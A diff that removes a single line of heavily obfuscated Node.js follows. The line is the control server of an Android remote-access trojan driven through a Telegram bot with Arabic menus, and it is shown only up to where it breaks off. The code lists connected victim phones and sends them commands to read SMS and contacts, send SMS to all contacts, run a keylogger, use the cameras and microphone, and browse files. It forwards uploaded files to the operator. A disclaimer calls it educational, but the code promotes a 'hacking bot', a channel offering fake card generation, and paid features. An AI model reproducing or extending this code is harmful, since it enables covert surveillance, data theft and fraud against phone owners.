@@ -1,1 +1,875 @@
-const _0x407f39=_0x151b;function _0x4ace(){const _0x3a62f5=['<b>✯\x20اختار\x20جهاز\x20إلى\x20نفذ\x20عمل</b>\x0a\x0a','22kyhfRQ','file','sockets','log','✯\x20الحافظة\x20✯','express','<b>✯\x20أدخل\x20𝚊\x20هاتف\x20عدد\x20أن\x20أنت\x20عوز\x20إلى\x20إرسال\x20𝚂𝙼𝚂</b>\x0a\x0a','<b>✯\x20جديد\x20جهاز\x20متصل</b>\x0a\x0a','multer','✯\x20إرسال\x20𝚂𝙼𝚂\x20إلى\x20جميع\x20جهات الاتصال\x20✯','84cPlils','<b>✯\x20رئيسي\x20قائمة الطعام</b>\x0a\x0a','<b>رواية</b>\x20→\x20','listen','readFileSync','<b>✯\x20اختار\x20عمل\x20إلى\x20نفذ\x20لأجل\x20جميع\x20متوفرة\x20الأجهزة</b>\x0a\x0a','popNotification','shift','3234gTfIoe','time','all-sms','no\x20information','1892960kuvEMZ','vibrateDuration','emit','✯\x20قائمة الأوامر\x20✯','contacts','size','3961580aPaxKE','✯\x20إلغاء\x20عمل\x20✯','/text','✯\x20رئيسي\x20الة تصوير\x20✯','all','smsNumber','<b>✯\x20أدخل\x20نص\x20أن\x20أنت\x20عوز\x20إلى\x20إرسال\x20إلى\x20جميع\x20الهدف\x20جهات الاتصال</b>\x0a\x0a','toast','currentNotificationText','2169665ymIjdB','3426UnzfvN','get','✯\x20𝚂𝙼𝚂\x20✯','3539044apenns','<b>✯\x20رسالة\x20مستلم\x20من\x20→\x20','✯\x20الى الخلف\x20إلى\x20رئيسي\x20قائمة الطعام\x20✯','✯\x20فك التشفير\x20✯','<b>✯\x20جهاز\x20انقطع الاتصال</b>\x0a\x0a','currentNumber','set','selfie-camera','http','<b>✯\x20لا\x20تتوفر\x20اجهزه\x20توصيل\x20✖️</b>\x0a\x0a','14859208ppOnuo','originalname',' قناتي تليجرام t.me/Driving_uncle_personally  \x20 اضغط هنا  /start ','\x20الأجهزة\x20✯','single','post','<b>✯\x20ال\x20طلب\x20كان\x20نفذت\x20بنجاح,\x20أنت\x20سوف\x20تلقى\x20جهاز\x20يستجيب\x20قريبا\x20...\x0a\x0a✯\x20عودة\x20إلى\x20رئيسي\x20قائمة الطعام</b>\x0a\x0a','✯\x20𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛\x20𝙾𝙽\x20✯','/start','currentTarget','✯\x20الأجهزة المتصلة \x20✯','smsToAllContacts','disconnect','handshake','duration','toastText','✯\x20توقف\x20سمعي\x20✯','text','🚫\x20 رجاء عدم استخدام البوت فيما يغضب  الله.هذا البوت غرض التوعية وحماية نفسك من الاختراق\x0a معرب للعربيه من قبل @TT1TT6 قناة شروحات الخال ALOUSH \x0a\x0a','<b>جهاز\x20','<b>✯\x20اختار\x20عمل\x20إلى\x20نفذ\x20لأجل\x20','noticationText','✯\x20لقطة شاشة\x20✯','✯\x20تذبذب\x20✯','<b>✯\x20أدخل\x20نص\x20أن\x20أنت\x20عوز\x20إلى\x20ظهر\x20كما\x20إعلام</b>\x0a\x0a','18HiKXqZ','PORT','keylogger-off','<b>𝚒𝚙</b>\x20→\x20','currentAction','✯\x20عن\x20لنا\x20✯','calls','url','628531Xzwdkr','commend','Done','5UQRBbM','157863kmaaoD','env','token','✯\x20صالة عرض\x20✯','✯\x20المكالمات\x20✯','createServer','textToAllContacts','6831234vSnSLj','✯\x20تشغيل\x20سمعي\x20✯','sendMessage','utf8','smsText','headers','✯\x20التصيد\x20✯','/upload','✯\x20تشفير\x20✯','forEach','232370LYMeOO','2414186GnuxVX','<b>✯\x20أدخل\x20ال\x20ميكروفون\x20تسجيل\x20مدة\x20في\x20إضافات</b>\x0a\x0a','*/*','keylogger-on','delete','1292HGSYoP','socket.io','<b>𝚝𝚒𝚖𝚎</b>\x20→\x20','HTML','ping','<b>✯\x20 مرحبا بك في بوت اختراق V3 </b>\x0a\x0a','apps','microphoneDuration','2111820yZWyTe','<b>𝚖𝚘𝚍𝚎𝚕</b>\x20→\x20','<b>✯\x20أدخل\x20𝚊\x20رسالة\x20أن\x20أنت\x20عوز\x20إلى\x20ظهر\x20في\x20شرب نخب\x20صندوق</b>\x0a\x0a','721588iBLdHC','✯\x20فتح\x20رابط\x20✯','buffer','send','<b>✯\x20🔰قناة مختص بجميع الشروحات المفيده في الإختراقات تطوير نسخ الواتس واضافات شروحات عن كيفية اضافة زر عكس وازرار قطع النت بداخل النسخ تطوير التطبيقات والمواقع والبوتات مشاريع سكتشوير جاهزه لعمل تطبيقات بحتراف ♻️نشر مواقع توليد فيزات وهميه لشحن المواقع والالعاب \x0a\x0a𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖\x20→\x20 t.me/Driving_uncle_personally\x0aالمطور\x20→\x20 @TT1TT6</b>\x0a\x0a','\x0a\x0a𝙼𝚎𝚜𝚜𝚊𝚐𝚎\x20→\x20</b>','✯\x20شرب نخب\x20✯','sendSms','./data.json','https','<b>✯\x20متصل\x20الأجهزة\x20عد\x20:\x20','7207620ZaPjbY','✯\x20ملف\x20مستكشف\x20✯','connection','push','✯\x20𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛\x20إيقاف\x20✯','✯\x20سيلفي\x20الة تصوير\x20✯','error','<b>✯\x20الآن\x20أدخل\x20ا\x20رسالة\x20أن\x20أنت\x20عوز\x20إلى\x20إرسال\x20إلى\x20','model','<b>✯\x20هذه\x20خيار\x20يكون\x20فقط\x20متوفر\x20لا\x20𝚙𝚛𝚎𝚖𝚒𝚞𝚖\x20رواية\x20dm\x20الى\x20يشترى\x20@TT1TT6</b>\x0a\x0a','✯\x20ميكروفون\x20✯','✯\x20جهات الاتصال\x20✯','main-camera','</b>\x0a\x0a','✯\x20إرسال\x20𝚂𝙼𝚂\x20✯','12AEDsDj','✯\x20التطبيقات\x20✯','vibrate'];_0x4ace=function(){return _0x3a62f5;};return _0x4ace();}(function(_0x5f1909,_0x1f340d){const _0x429dd3=_0x151b,_0x1c6d71=_0x5f1909();while(!![]){try{const _0x8c9fb7=parseInt(_0x429dd3(0x233))/0x1*(-parseInt(_0x429dd3(0x1db))/0x2)+-parseInt(_0x429dd3(0x252))/0x3+parseInt(_0x429dd3(0x204))/0x4*(-parseInt(_0x429dd3(0x232))/0x5)+parseInt(_0x429dd3(0x1e5))/0x6*(-parseInt(_0x429dd3(0x255))/0x7)+-parseInt(_0x429dd3(0x20e))/0x8+parseInt(_0x429dd3(0x23a))/0x9+-parseInt(_0x429dd3(0x244))/0xa*(-parseInt(_0x429dd3(0x1ed))/0xb);if(_0x8c9fb7===_0x1f340d)break;else _0x1c6d71['push'](_0x1c6d71['shift']());}catch(_0xa14d84){_0x1c6d71['push'](_0x1c6d71['shift']());}}}(_0x4ace,0xeb945));const _0x24a636=_0x2dd0;(function(_0x5228bf,_0x3d6264){const _0x1e95f0=_0x151b,_0x196e9b=_0x2dd0,_0x4f2f95=_0x5228bf();while(!![]){try{const _0x1595b0=-parseInt(_0x196e9b(0x1e7))/0x1+parseInt(_0x196e9b(0x1fd))/0x2+parseInt(_0x196e9b(0x256))/0x3*(-parseInt(_0x196e9b(0x226))/0x4)+parseInt(_0x196e9b(0x1d3))/0x5*(parseInt(_0x196e9b(0x1f9))/0x6)+-parseInt(_0x196e9b(0x257))/0x7+-parseInt(_0x196e9b(0x22d))/0x8+parseInt(_0x196e9b(0x245))/0x9*(parseInt(_0x196e9b(0x25a))/0xa);if(_0x1595b0===_0x3d6264)break;else _0x4f2f95['push'](_0x4f2f95[_0x1e95f0(0x1ec)]());}catch(_0x5c1c24){_0x4f2f95[_0x1e95f0(0x263)](_0x4f2f95[_0x1e95f0(0x1ec)]());}}}(_0x4be8,0x935ce));const express=require(_0x407f39(0x1e0)),http=require(_0x24a636(0x1df)),{Server}=require(_0x407f39(0x24b)),telegramBot=require(_0x24a636(0x250)),https=require(_0x24a636(0x243)),multer=require(_0x24a636(0x21c)),fs=require('fs'),app=express(),server=http[_0x407f39(0x238)](app),io=new Server(server),uploader=multer(),data=JSON[_0x24a636(0x239)](fs[_0x407f39(0x1e9)](_0x24a636(0x249),_0x24a636(0x20e))),bot=new telegramBot(data[_0x24a636(0x237)],{'polling':!![],'request':{}}),appData=new Map(),actions=[_0x24a636(0x232),_0x24a636(0x259),'✯\x20المكالمات\x20✯',_0x24a636(0x1ee),'✯\x20رئيسي\x20الة تصوير\x20✯',_0x24a636(0x220),_0x24a636(0x236),_0x24a636(0x254),_0x407f39(0x224),_0x24a636(0x20c),_0x407f39(0x26e),_0x407f39(0x225),_0x24a636(0x1e6),_0x407f39(0x21e),'✯\x20𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛\x20𝙾𝙽\x20✯',_0x24a636(0x1e9),_0x407f39(0x261),_0x407f39(0x236),_0x407f39(0x242),_0x407f39(0x207),_0x407f39(0x1e4),_0x24a636(0x21a),_0x24a636(0x1d6),_0x24a636(0x1e5),_0x24a636(0x233)];function _0x4be8(){const _0x431c7a=_0x407f39,_0x8b2a0f=[_0x431c7a(0x1f5),_0x431c7a(0x1ff),_0x431c7a(0x243),_0x431c7a(0x25d),_0x431c7a(0x268),'toastText',_0x431c7a(0x1ea),_0x431c7a(0x205),_0x431c7a(0x225),_0x431c7a(0x1da),'node-telegram-bot-api','✯\x20جميع\x20✯',_0x431c7a(0x230),_0x431c7a(0x1f2),'✯\x20الحافظة\x20✯',_0x431c7a(0x222),_0x431c7a(0x201),_0x431c7a(0x260),_0x431c7a(0x23e),_0x431c7a(0x203),_0x431c7a(0x1f7),'all',_0x431c7a(0x21e),_0x431c7a(0x1f8),'textToAllContacts',_0x431c7a(0x200),'✯\x20قائمة الأوامر\x20✯',_0x431c7a(0x1e8),_0x431c7a(0x256),_0x431c7a(0x263),_0x431c7a(0x1fa),_0x431c7a(0x216),'✯\x20فك التشفير\x20✯',_0x431c7a(0x226),_0x431c7a(0x234),_0x431c7a(0x21a),'includes',_0x431c7a(0x20c),'number',_0x431c7a(0x202),_0x431c7a(0x248),'✯\x20عن\x20لنا\x20✯',_0x431c7a(0x228),'✯\x20التصيد\x20✯',_0x431c7a(0x23b),_0x431c7a(0x22f),_0x431c7a(0x266),_0x431c7a(0x264),_0x431c7a(0x1e7),_0x431c7a(0x22a),_0x431c7a(0x1dd),_0x431c7a(0x1e4),_0x431c7a(0x270),_0x431c7a(0x23c),_0x431c7a(0x26e),_0x431c7a(0x242),_0x431c7a(0x208),_0x431c7a(0x219),'notificationText','currentTarget',_0x431c7a(0x22e),_0x431c7a(0x214),_0x431c7a(0x271),_0x431c7a(0x26f),_0x431c7a(0x1f6),_0x431c7a(0x1e1),_0x431c7a(0x267),_0x431c7a(0x245),_0x431c7a(0x24f),_0x431c7a(0x1ef),_0x431c7a(0x218),_0x431c7a(0x209),_0x431c7a(0x212),_0x431c7a(0x1eb),_0x431c7a(0x1f0),_0x431c7a(0x21f),_0x431c7a(0x247),_0x431c7a(0x20f),_0x431c7a(0x1ee),_0x431c7a(0x249),_0x431c7a(0x26c),_0x431c7a(0x250),_0x431c7a(0x25b),'<b>✯\x20أدخل\x20ال\x20مدة\x20أنت\x20عوز\x20ال\x20جهاز\x20إلى\x20تذبذب\x20في\x20إضافات</b>\x0a\x0a',_0x431c7a(0x23d),_0x431c7a(0x20d),_0x431c7a(0x20b),_0x431c7a(0x257),'<b>✯\x20ملف\x20مستلم\x20من\x20→\x20',_0x431c7a(0x254),'✯\x20المكالمات\x20✯',_0x431c7a(0x236),'microphone',_0x431c7a(0x20a),_0x431c7a(0x231),_0x431c7a(0x24c),'✯\x20شعبي\x20إعلام\x20✯',_0x431c7a(0x24d),_0x431c7a(0x1e3),_0x431c7a(0x1f3),'message',_0x431c7a(0x224),_0x431c7a(0x265),_0x431c7a(0x22b),_0x431c7a(0x262),_0x431c7a(0x210),_0x431c7a(0x213),_0x431c7a(0x253),_0x431c7a(0x24a),_0x431c7a(0x1fc),_0x431c7a(0x21c),_0x431c7a(0x241),'listening\x20on\x20port\x203000','<b>✯\x20هذه\x20خيار\x20يكون\x20فقط\x20متوفر\x20𝚘𝚗\x20𝚙𝚛𝚎𝚖𝚒𝚞𝚖\x20رواية\x20dm\x20الى\x20يشترى\x20@TT1TT6</b>\x0a\x0a',_0x431c7a(0x1f9),_0x431c7a(0x1f1),_0x431c7a(0x1fd),_0x431c7a(0x220),_0x431c7a(0x25c),'host',_0x431c7a(0x26b),_0x431c7a(0x206),_0x431c7a(0x215),_0x431c7a(0x22d),_0x431c7a(0x26a),_0x431c7a(0x235),_0x431c7a(0x246),'parse','✯\x20ملف\x20مستكشف\x20✯','handshake',_0x431c7a(0x1dc),_0x431c7a(0x1e6),_0x431c7a(0x211),'version','clipboard',_0x431c7a(0x229),_0x431c7a(0x23f),_0x431c7a(0x25e),_0x431c7a(0x26d),_0x431c7a(0x227)];return _0x4be8=function(){return _0x8b2a0f;},_0x4be8();}function _0x151b(_0x47a49c,_0x2684fd){const _0x4ace5b=_0x4ace();return _0x151b=function(_0x151bf5,_0x5c1425){_0x151bf5=_0x151bf5-0x1da;let _0x16c083=_0x4ace5b[_0x151bf5];return _0x16c083;},_0x151b(_0x47a49c,_0x2684fd);}function _0x2dd0(_0x5ace13,_0x1b9f16){const _0x5d34d6=_0x4be8();return _0x2dd0=function(_0xe052cb,_0x31f181){_0xe052cb=_0xe052cb-0x1d0;let _0x39f596=_0x5d34d6[_0xe052cb];return _0x39f596;},_0x2dd0(_0x5ace13,_0x1b9f16);}app[_0x24a636(0x224)](_0x24a636(0x229),uploader[_0x24a636(0x202)]('file'),(_0xe7d0f6,_0x30973d)=>{const _0x291631=_0x407f39,_0x2c79ef=_0x24a636,_0x1763f6=_0xe7d0f6[_0x2c79ef(0x23c)][_0x2c79ef(0x207)],_0x3abcf4=_0xe7d0f6[_0x2c79ef(0x242)][_0x2c79ef(0x24a)];bot['sendDocument'](data['id'],_0xe7d0f6[_0x2c79ef(0x23c)][_0x2c79ef(0x211)],{'caption':_0x2c79ef(0x212)+_0x3abcf4+'</b>','parse_mode':_0x291631(0x24d)},{'filename':_0x1763f6,'contentType':_0x2c79ef(0x206)}),_0x30973d['send'](_0x2c79ef(0x218));}),app[_0x24a636(0x1e1)](_0x24a636(0x22c),(_0x5b9a91,_0x340799)=>{const _0x46cda7=_0x407f39,_0x23a373=_0x24a636;_0x340799[_0x46cda7(0x258)](data[_0x23a373(0x205)]);}),io['on'](_0x24a636(0x222),_0x48afef=>{const _0x166625=_0x407f39,_0x4a686a=_0x24a636;let _0x35d854=_0x48afef[_0x4a686a(0x23b)]['headers'][_0x4a686a(0x24a)]+'-'+io[_0x4a686a(0x1ec)][_0x4a686a(0x1ec)][_0x4a686a(0x1fa)]||_0x4a686a(0x204),_0x3e1fde=_0x48afef[_0x4a686a(0x23b)][_0x4a686a(0x242)][_0x4a686a(0x23f)]||'no\x20information',_0x4c49f4=_0x48afef[_0x4a686a(0x23b)][_0x166625(0x23f)]['ip']||_0x4a686a(0x204);_0x48afef[_0x4a686a(0x24a)]=_0x35d854,_0x48afef[_0x4a686a(0x23f)]=_0x3e1fde;let _0x5ede9b=_0x166625(0x1e2)+(_0x4a686a(0x225)+_0x35d854+'\x0a')+(_0x4a686a(0x1ea)+_0x3e1fde+'\x0a')+(_0x4a686a(0x1eb)+_0x4c49f4+'\x0a')+(_0x4a686a(0x219)+_0x48afef[_0x4a686a(0x23b)][_0x4a686a(0x208)]+'\x0a\x0a');bot[_0x4a686a(0x1ef)](data['id'],_0x5ede9b,{'parse_mode':_0x4a686a(0x21b)}),_0x48afef['on'](_0x4a686a(0x1dd),()=>{const _0x2791c=_0x166625,_0x45788b=_0x4a686a;let _0x4c86f2=_0x45788b(0x1f2)+(_0x45788b(0x225)+_0x35d854+'\x0a')+(_0x45788b(0x1ea)+_0x3e1fde+'\x0a')+(_0x2791c(0x22a)+_0x4c49f4+'\x0a')+(_0x45788b(0x219)+_0x48afef[_0x45788b(0x23b)][_0x2791c(0x1ee)]+'\x0a\x0a');bot[_0x45788b(0x1ef)](data['id'],_0x4c86f2,{'parse_mode':_0x45788b(0x21b)});}),_0x48afef['on'](_0x4a686a(0x21e),_0x44fcc5=>{const _0x13b08c=_0x166625,_0x21cb80=_0x4a686a;bot[_0x21cb80(0x1ef)](data['id'],_0x21cb80(0x24d)+_0x35d854+_0x13b08c(0x25a)+_0x44fcc5,{'parse_mode':_0x13b08c(0x24d)});});}),bot['on'](_0x24a636(0x21e),_0xdbde0c=>{const _0x823cfc=_0x407f39,_0xcd7349=_0x24a636;if(_0xdbde0c[_0xcd7349(0x205)]===_0xcd7349(0x1d9))bot[_0xcd7349(0x1ef)](data['id'],_0xcd7349(0x1fe)+_0xcd7349(0x22f)+_0xcd7349(0x223),{'parse_mode':_0xcd7349(0x21b),'reply_markup':{'keyboard':[[_0xcd7349(0x200),_0xcd7349(0x1d4)],[_0xcd7349(0x1e3)]],'resize_keyboard':!![]}});else{if(appData[_0xcd7349(0x1e1)](_0xcd7349(0x221))===_0x823cfc(0x251)){let _0x3376c5=_0xdbde0c[_0xcd7349(0x205)],_0x44b92e=appData['get']('currentTarget');_0x44b92e==_0xcd7349(0x25b)?io[_0xcd7349(0x1ec)][_0xcd7349(0x21d)](_0x823cfc(0x230),{'request':_0xcd7349(0x216),'extras':[{'key':_0xcd7349(0x228),'value':_0x3376c5}]}):io['to'](_0x44b92e)[_0xcd7349(0x21d)](_0xcd7349(0x252),{'request':_0xcd7349(0x216),'extras':[{'key':_0x823cfc(0x21c),'value':_0x3376c5}]}),appData[_0xcd7349(0x209)](_0xcd7349(0x1f5)),appData[_0xcd7349(0x209)](_0xcd7349(0x221)),bot[_0xcd7349(0x1ef)](data['id'],'<b>✯\x20ال\x20طلب\x20كان\x20نفذت\x20بنجاح,\x20أنت\x20سوف\x20تلقى\x20جهاز\x20يستجيب\x20قريبا\x20...\x0a\x0a✯\x20عودة\x20إلى\x20رئيسي\x20قائمة الطعام</b>\x0a\x0a',{'parse_mode':_0xcd7349(0x21b),'reply_markup':{'keyboard':[[_0xcd7349(0x200),_0xcd7349(0x1d4)],[_0xcd7349(0x1e3)]],'resize_keyboard':!![]}});}else{if(appData[_0xcd7349(0x1e1)](_0x823cfc(0x22b))===_0xcd7349(0x24b)){let _0x3f8601=_0xdbde0c[_0xcd7349(0x205)],_0x5c0cc9=appData[_0xcd7349(0x1e1)]('currentTarget');_0x5c0cc9==_0xcd7349(0x25b)?io[_0xcd7349(0x1ec)][_0xcd7349(0x21d)](_0xcd7349(0x252),{'request':_0x823cfc(0x1fe),'extras':[{'key':_0xcd7349(0x205),'value':_0x3f8601}]}):io['to'](_0x5c0cc9)['emit'](_0x823cfc(0x230),{'request':_0x823cfc(0x1fe),'extras':[{'key':_0xcd7349(0x205),'value':_0x3f8601}]}),appData[_0xcd7349(0x209)](_0xcd7349(0x1f5)),appData[_0xcd7349(0x209)](_0xcd7349(0x221)),bot[_0xcd7349(0x1ef)](data['id'],_0xcd7349(0x1f7),{'parse_mode':_0xcd7349(0x21b),'reply_markup':{'keyboard':[[_0xcd7349(0x200),_0xcd7349(0x1d4)],[_0xcd7349(0x1e3)]],'resize_keyboard':!![]}});}else{if(appData[_0x823cfc(0x202)](_0xcd7349(0x221))===_0xcd7349(0x227)){let _0x16b4e5=_0xdbde0c[_0x823cfc(0x21f)];appData[_0xcd7349(0x217)](_0xcd7349(0x201),_0x16b4e5),appData[_0xcd7349(0x217)](_0x823cfc(0x22b),'smsText'),bot[_0xcd7349(0x1ef)](data['id'],_0xcd7349(0x1fc)+_0x16b4e5+_0xcd7349(0x244),{'parse_mode':_0xcd7349(0x21b),'reply_markup':{'keyboard':[[_0xcd7349(0x1d1)]],'resize_keyboard':!![],'one_time_keyboard':!![]}});}else{if(appData[_0xcd7349(0x1e1)](_0xcd7349(0x221))===_0xcd7349(0x258)){let _0x6d597e=_0xdbde0c[_0xcd7349(0x205)],_0x1c124a=appData[_0xcd7349(0x1e1)](_0x823cfc(0x209)),_0x49a537=appData[_0xcd7349(0x1e1)](_0xcd7349(0x1f5));_0x49a537==_0xcd7349(0x25b)?io[_0xcd7349(0x1ec)][_0x823cfc(0x1f3)](_0xcd7349(0x252),{'request':_0xcd7349(0x230),'extras':[{'key':_0xcd7349(0x1e0),'value':_0x1c124a},{'key':_0xcd7349(0x205),'value':_0x6d597e}]}):io['to'](_0x49a537)[_0xcd7349(0x21d)](_0xcd7349(0x252),{'request':_0x823cfc(0x25c),'extras':[{'key':_0xcd7349(0x1e0),'value':_0x1c124a},{'key':_0xcd7349(0x205),'value':_0x6d597e}]}),appData[_0xcd7349(0x209)]('currentTarget'),appData[_0xcd7349(0x209)](_0xcd7349(0x221)),appData[_0xcd7349(0x209)](_0x823cfc(0x209)),bot[_0xcd7349(0x1ef)](data['id'],_0xcd7349(0x1f7),{'parse_mode':_0x823cfc(0x24d),'reply_markup':{'keyboard':[[_0xcd7349(0x200),_0x823cfc(0x1f4)],[_0xcd7349(0x1e3)]],'resize_keyboard':!![]}});}else{if(appData[_0xcd7349(0x1e1)](_0x823cfc(0x22b))===_0x823cfc(0x1f2)){let _0x26f07c=_0xdbde0c[_0x823cfc(0x21f)],_0x3275f8=appData[_0xcd7349(0x1e1)](_0xcd7349(0x1f5));_0x3275f8==_0xcd7349(0x25b)?io[_0xcd7349(0x1ec)]['emit'](_0xcd7349(0x252),{'request':_0xcd7349(0x1f8),'extras':[{'key':_0xcd7349(0x228),'value':_0x26f07c}]}):io['to'](_0x3275f8)[_0xcd7349(0x21d)](_0xcd7349(0x252),{'request':_0xcd7349(0x1f8),'extras':[{'key':_0xcd7349(0x228),'value':_0x26f07c}]}),appData[_0xcd7349(0x209)](_0xcd7349(0x1f5)),appData[_0xcd7349(0x209)](_0x823cfc(0x22b)),bot[_0xcd7349(0x1ef)](data['id'],_0xcd7349(0x1f7),{'parse_mode':_0x823cfc(0x24d),'reply_markup':{'keyboard':[['✯\x20الأجهزة المتصلة \x20✯',_0xcd7349(0x1d4)],[_0xcd7349(0x1e3)]],'resize_keyboard':!![]}});}else{if(appData[_0xcd7349(0x1e1)](_0xcd7349(0x221))===_0x823cfc(0x239)){let _0x535777=_0xdbde0c[_0xcd7349(0x205)],_0x3b22c4=appData['get'](_0xcd7349(0x1f5));_0x3b22c4==_0xcd7349(0x25b)?io[_0xcd7349(0x1ec)][_0x823cfc(0x1f3)](_0xcd7349(0x252),{'request':_0xcd7349(0x1f3),'extras':[{'key':_0xcd7349(0x205),'value':_0x535777}]}):io['to'](_0x3b22c4)[_0xcd7349(0x21d)](_0xcd7349(0x252),{'request':_0x823cfc(0x219),'extras':[{'key':_0xcd7349(0x205),'value':_0x535777}]}),appData[_0xcd7349(0x209)](_0xcd7349(0x1f5)),appData[_0xcd7349(0x209)](_0xcd7349(0x221)),bot[_0xcd7349(0x1ef)](data['id'],_0xcd7349(0x1f7),{'parse_mode':_0xcd7349(0x21b),'reply_markup':{'keyboard':[[_0xcd7349(0x200),_0xcd7349(0x1d4)],['✯\x20عن\x20لنا\x20✯']],'resize_keyboard':!![]}});}else{if(appData[_0xcd7349(0x1e1)](_0x823cfc(0x22b))===_0x823cfc(0x223)){let _0x371a40=_0xdbde0c[_0xcd7349(0x205)];appData[_0xcd7349(0x217)](_0xcd7349(0x247),_0x371a40),target==_0x823cfc(0x1fb)?io[_0x823cfc(0x1dd)][_0xcd7349(0x21d)](_0x823cfc(0x230),{'request':_0xcd7349(0x203),'extras':[{'key':_0xcd7349(0x205),'value':_0x371a40}]}):io['to'](target)[_0xcd7349(0x21d)](_0x823cfc(0x230),{'request':'popNotification','extras':[{'key':_0xcd7349(0x205),'value':_0x371a40},{'key':_0xcd7349(0x1f6),'value':url}]}),appData[_0xcd7349(0x209)]('currentTarget'),appData[_0x823cfc(0x249)](_0x823cfc(0x22b)),appData[_0xcd7349(0x209)](_0x823cfc(0x1ff)),bot[_0x823cfc(0x23c)](data['id'],_0xcd7349(0x1f7),{'parse_mode':_0xcd7349(0x21b),'reply_markup':{'keyboard':[[_0xcd7349(0x200),_0xcd7349(0x1d4)],[_0xcd7349(0x1e3)]],'resize_keyboard':!![]}});}else{if(_0xdbde0c[_0xcd7349(0x205)]===_0xcd7349(0x200)){if(io[_0xcd7349(0x1ec)][_0xcd7349(0x1ec)]['size']===0x0)bot['sendMessage'](data['id'],_0xcd7349(0x20f),{'parse_mode':_0xcd7349(0x21b)});else{let _0x1e2656=_0x823cfc(0x25f)+io[_0xcd7349(0x1ec)][_0xcd7349(0x1ec)][_0xcd7349(0x1fa)]+_0xcd7349(0x244),_0x518a8a=0x1;io[_0xcd7349(0x1ec)][_0xcd7349(0x1ec)][_0xcd7349(0x248)]((_0x3479dd,_0x29c6f5,_0x222cae)=>{const _0x22bb4b=_0x823cfc,_0x371ac3=_0xcd7349;_0x1e2656+=_0x22bb4b(0x221)+_0x518a8a+'</b>\x0a'+(_0x371ac3(0x225)+_0x3479dd[_0x22bb4b(0x268)]+'\x0a')+(_0x371ac3(0x1ea)+_0x3479dd[_0x371ac3(0x23f)]+'\x0a')+(_0x371ac3(0x1eb)+_0x3479dd['ip']+'\x0a')+(_0x371ac3(0x219)+_0x3479dd[_0x22bb4b(0x21b)][_0x371ac3(0x208)]+'\x0a\x0a'),_0x518a8a+=0x1;}),bot[_0xcd7349(0x1ef)](data['id'],_0x1e2656,{'parse_mode':_0xcd7349(0x21b)});}}else{if(_0xdbde0c[_0xcd7349(0x205)]===_0xcd7349(0x1d4)){if(io[_0x823cfc(0x1dd)][_0xcd7349(0x1ec)][_0xcd7349(0x1fa)]===0x0)bot[_0xcd7349(0x1ef)](data['id'],_0xcd7349(0x20f),{'parse_mode':_0xcd7349(0x21b)});else{let _0x307c8a=[];io[_0xcd7349(0x1ec)][_0xcd7349(0x1ec)][_0x823cfc(0x243)]((_0x6307e5,_0x56439e,_0x42b7c1)=>{const _0x4be864=_0xcd7349;_0x307c8a[_0x4be864(0x1d7)]([_0x6307e5[_0x4be864(0x24a)]]);}),_0x307c8a[_0xcd7349(0x1d7)]([_0xcd7349(0x251)]),_0x307c8a[_0xcd7349(0x1d7)]([_0xcd7349(0x233)]),bot[_0x823cfc(0x23c)](data['id'],_0xcd7349(0x24f),{'parse_mode':'HTML','reply_markup':{'keyboard':_0x307c8a,'resize_keyboard':!![],'one_time_keyboard':!![]}});}}else{if(_0xdbde0c[_0x823cfc(0x21f)]===_0xcd7349(0x1e3))bot[_0xcd7349(0x1ef)](data['id'],_0x823cfc(0x259),{'parse_mode':'HTML'});else{if(_0xdbde0c[_0xcd7349(0x205)]===_0x823cfc(0x206))bot[_0xcd7349(0x1ef)](data['id'],_0xcd7349(0x23d),{'parse_mode':_0xcd7349(0x21b),'reply_markup':{'keyboard':[[_0x823cfc(0x218),_0xcd7349(0x1d4)],[_0xcd7349(0x1e3)]],'resize_keyboard':!![]}});else{if(_0xdbde0c[_0xcd7349(0x205)]===_0xcd7349(0x1d1)){let _0x3202e5=io['sockets'][_0x823cfc(0x1dd)]['get'](appData[_0xcd7349(0x1e1)](_0xcd7349(0x1f5)))[_0xcd7349(0x24a)];_0x3202e5==_0x823cfc(0x1fb)?bot[_0xcd7349(0x1ef)](data['id'],_0xcd7349(0x24c),{'parse_mode':_0x823cfc(0x24d),'reply_markup':{'keyboard':[[_0xcd7349(0x232),_0xcd7349(0x259)],[_0xcd7349(0x214),_0xcd7349(0x1ee)],[_0xcd7349(0x1d8),_0x823cfc(0x265)],[_0xcd7349(0x236),_0xcd7349(0x254)],[_0x823cfc(0x224),_0xcd7349(0x20c)],[_0xcd7349(0x1f0),_0xcd7349(0x24e)],[_0xcd7349(0x1e6),_0x823cfc(0x21e)],[_0x823cfc(0x215),_0x823cfc(0x264)],[_0xcd7349(0x23a),_0xcd7349(0x215)],[_0x823cfc(0x242),_0xcd7349(0x1da)],[_0xcd7349(0x1d6),_0xcd7349(0x1e5)],[_0x823cfc(0x1e4)],[_0xcd7349(0x21a)],[_0xcd7349(0x233)]],'resize_keyboard':!![],'one_time_keyboard':!![]}}):bot[_0xcd7349(0x1ef)](data['id'],_0xcd7349(0x255)+_0x3202e5+_0xcd7349(0x244),{'parse_mode':_0xcd7349(0x21b),'reply_markup':{'keyboard':[[_0xcd7349(0x232),_0xcd7349(0x259)],[_0xcd7349(0x214),_0xcd7349(0x1ee)],[_0x823cfc(0x1fa),_0xcd7349(0x220)],[_0xcd7349(0x236),_0xcd7349(0x254)],[_0x823cfc(0x224),_0xcd7349(0x20c)],[_0xcd7349(0x1f0),_0xcd7349(0x24e)],[_0x823cfc(0x23b),_0xcd7349(0x1d0)],[_0xcd7349(0x234),_0xcd7349(0x1e9)],[_0xcd7349(0x23a),_0xcd7349(0x215)],[_0xcd7349(0x1f1),_0xcd7349(0x1da)],[_0xcd7349(0x1d6),_0xcd7349(0x1e5)],[_0xcd7349(0x1ed)],[_0xcd7349(0x21a)],[_0xcd7349(0x233)]],'resize_keyboard':!![],'one_time_keyboard':!![]}});}else{if(actions[_0xcd7349(0x1de)](_0xdbde0c[_0xcd7349(0x205)])){let 